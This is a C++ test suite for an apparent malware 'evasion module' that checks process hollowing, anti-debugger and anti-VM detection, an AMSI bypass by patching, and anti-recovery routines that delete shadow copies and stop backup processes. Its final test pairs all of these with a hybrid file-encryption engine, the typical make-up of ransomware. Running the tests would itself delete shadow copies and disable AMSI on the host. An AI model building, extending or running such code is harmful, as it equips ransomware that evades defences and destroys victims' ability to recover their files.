// Test for Moz Evasion Module (Phase 3)
#include "moz_evasion.h"
#include "moz_crypto.h"
#include <iostream>
#include <cassert>

using namespace moz;

int main() {
    std::cout << "=== Moz Evasion Module Test Suite (Phase 3) ===" << std::endl;
    
    // Test 1: ProcessHollowing availability
    std::cout << "\n[TEST 1] ProcessHollowing::isAvailable()..." << std::endl;
    {
        bool avail = ProcessHollowing::isAvailable();
        std::cout << "  Available: " << (avail ? "yes" : "no (non-Windows platform)") << std::endl;
        std::cout << "  PASSED: ProcessHollowing stub works" << std::endl;
    }
    
    // Test 2: AntiAnalysis checks
    std::cout << "\n[TEST 2] Anti-analysis checks..." << std::endl;
    {
        bool debug = AntiAnalysis::isDebuggerPresent();
        std::cout << "  Debugger present: " << (debug ? "yes" : "no") << std::endl;
        
        bool remote = AntiAnalysis::checkRemoteDebugger();
        std::cout << "  Remote debugger: " << (remote ? "yes" : "no") << std::endl;
        
        bool heap = AntiAnalysis::checkHeapFlags();
        std::cout << "  Heap flags tampered: " << (heap ? "yes" : "no") << std::endl;
        
        bool vm = AntiAnalysis::isVirtualMachine();
        std::cout << "  Virtual machine: " << (vm ? "yes" : "no") << std::endl;
        
        bool analyzed = AntiAnalysis::isBeingAnalyzed();
        std::cout << "  Being analyzed: " << (analyzed ? "yes" : "no") << std::endl;
        
        std::cout << "  PASSED: Anti-analysis checks executed" << std::endl;
    }
    
    // Test 3: AMSI bypass
    std::cout << "\n[TEST 3] AMSI bypass..." << std::endl;
    {
        bool active = AMSIBypass::isAmsiActive();
        std::cout << "  AMSI active: " << (active ? "yes" : "no") << std::endl;
        
        bool patched = AMSIBypass::bypassAmsiPatching();
        std::cout << "  AMSI patched: " << (patched ? "yes" : "no (non-Windows)") << std::endl;
        
        std::cout << "  PASSED: AMSI bypass functions executed" << std::endl;
    }
    
    // Test 4: AntiRecovery
    std::cout << "\n[TEST 4] Anti-recovery operations..." << std::endl;
    {
        bool deleted = AntiRecovery::deleteShadowCopies();
        std::cout << "  Shadow copies deleted: " << (deleted ? "yes" : "no (non-Windows or already clean)") << std::endl;
        
        bool stopped = AntiRecovery::stopBackupProcesses();
        std::cout << "  Backup processes stopped: " << (stopped ? "yes" : "no") << std::endl;
        
        std::cout << "  PASSED: Anti-recovery functions executed" << std::endl;
    }
    
    // Test 5: EvasionManager
    std::cout << "\n[TEST 5] EvasionManager..." << std::endl;
    {
        EvasionManager mgr;
        mgr.setVerbose(true);
        mgr.setForceEvasion(false); // Don't force on analysis detection
        
        bool result = mgr.runAntiAnalysis();
        std::cout << "  Anti-analysis passed: " << (result ? "yes" : "no (analysis detected)") << std::endl;
        std::cout << "  PASSED: EvasionManager works" << std::endl;
    }
    
    // Test 6: EvasionManager with force
    std::cout << "\n[TEST 6] EvasionManager forced mode..." << std::endl;
    {
        EvasionManager mgr;
        mgr.setForceEvasion(true);
        mgr.setVerbose(true);
        
        bool result = mgr.runAntiAnalysis();
        std::cout << "  Forced anti-analysis: " << (result ? "passed" : "failed") << std::endl;
        
        bool amsi = mgr.applyAMSIBypass();
        std::cout << "  AMSI bypass applied: " << (amsi ? "yes" : "no") << std::endl;
        
        std::cout << "  PASSED: EvasionManager forced mode works" << std::endl;
    }
    
    // Test 7: Integration with FileEncryption
    std::cout << "\n[TEST 7] Evasion + Crypto integration..." << std::endl;
    {
        EvasionManager mgr;
        mgr.setForceEvasion(true);
        mgr.setVerbose(false);
        
        // Run evasion checks (should complete without crashing)
        bool evasion_ok = mgr.runAntiAnalysis();
        std::cout << "  Evasion checks completed: " << (evasion_ok ? "yes" : "no") << std::endl;
        
        // Crypto still works after evasion
        CryptoEngine engine;
        bool init = engine.initialize({});
        std::cout << "  Crypto init after evasion: " << (init ? "yes" : "no") << std::endl;
        
        std::vector<uint8_t> test_data = {0x48, 0x65, 0x6c, 0x6c, 0x6f};
        EncryptedBlob blob;
        bool enc = engine.hybridEncrypt(test_data, blob);
        std::cout << "  Crypto encrypt after evasion: " << (enc ? "yes" : "no") << std::endl;
        
        std::vector<uint8_t> decrypted;
        bool dec = engine.hybridDecrypt(blob, decrypted);
        std::cout << "  Crypto decrypt: " << (dec && decrypted == test_data ? "yes" : "no") << std::endl;
        
        std::cout << "  PASSED: Evasion + Crypto integration" << std::endl;
    }
    
    std::cout << "\n=== All Phase 3 tests passed ===" << std::endl;
    return 0;
}
